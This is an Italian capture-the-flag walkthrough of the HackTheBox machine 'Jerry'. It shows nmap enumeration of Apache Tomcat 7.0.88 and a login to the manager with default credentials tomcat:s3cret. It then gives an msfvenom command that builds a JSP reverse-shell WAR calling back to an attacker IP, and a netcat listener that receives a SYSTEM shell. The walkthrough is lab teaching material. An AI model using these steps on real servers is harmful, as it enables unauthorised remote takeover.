---
title: "Jerry Walkthrough"
description: "Jerry è una macchina Windows di difficoltà easy che dimostra come sfruttare Apache Tomcat, ottenendo una shell di NT Authority \ SYSTEM e compromettendo completamente il target."
author: dua2z3rr
date: 2025-08-14 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Common Services", "Area di Interesse: Security Tools", "Area di Interesse: Enterprise Network", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Arbitrary File Upload", "Vulnerabilità: Default Credentials", "Codice: Java"]
image: /assets/img/jerry/jerry-resized.png"
---

## Enumerazione Esterna

### Nmap

Cominciamo con un nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.95 -vv -p-
<SNIP>
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.95 -sC -sV -vv -p 8080
<SNIP>
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
```

Possiamo vedere che sulla porta 8080 è prsente un **Apache Tomcat**

### HTTP

Aggiungiomo l'indirizzo ip al file `/etc/hosts`.

```Shell
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.10.95 jerry.htb
```

Visitiamo la porta 8080.

![Desktop View](/assets/img/jerry/jerry-sito.png)

Ci troviamo nella pagina iniziale subito dopo la installazione di apache tomcat. Esploriamola.

Nella documentazione del manager, troviamo questo:
![Desktop View](/assets/img/jerry/web-manager-jerry.png)

Proviamo ad accedere a `/manager/html`.

![Desktop View](/assets/img/jerry/jerry-login.png)

Fin ad ora, Apache tomcat sembra non abbia ricevuto modifiche. Proviamo ad accedere con le credeniali di default.

Ecco le credenziali di default per Tomcat 7.0.88: <https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown>

Si riesce ad accedere tramite alle credenziali **tomcat:s3cret** e ci ritroviamo alla pagina di tomcat Web Application Manager.

![Desktop View](/assets/img/jerry/jerry-web-application-manager.png)

Se le credenziali di default non avessero funzionato, avremmo dovuto provare ad accedere attraverso un brute-force attack con tool come **hydra** o **medusa**.

## Exploitation

Ora dobbiamo cercare un modo per ottenere una shell sulla macchna che hosta tomcat.

Possiamo fare il deploy di WAR sul sito.

![Desktop View](/assets/img/jerry/jerry-war-deploy.png)

Creiamo un fie WAR per ottenere una reverse shell.

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/jerry]
└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=9001 -f war -o rshell.war
Payload size: 1092 bytes
Final size of war file: 1092 bytes
Saved as: rshell.war
```

Procediamo col deploy del file WAR e otteniamo una reverse shell.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.95 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

Troviamo le flag e terminiamo la box.

## Conclusione

Jerry rappresenta un classico esempio di come configurazioni insicure su servizi comuni possano portare a compromissioni totali del sistema. La facilità di exploitation sottolinea l'importanza degli hardening baseline.
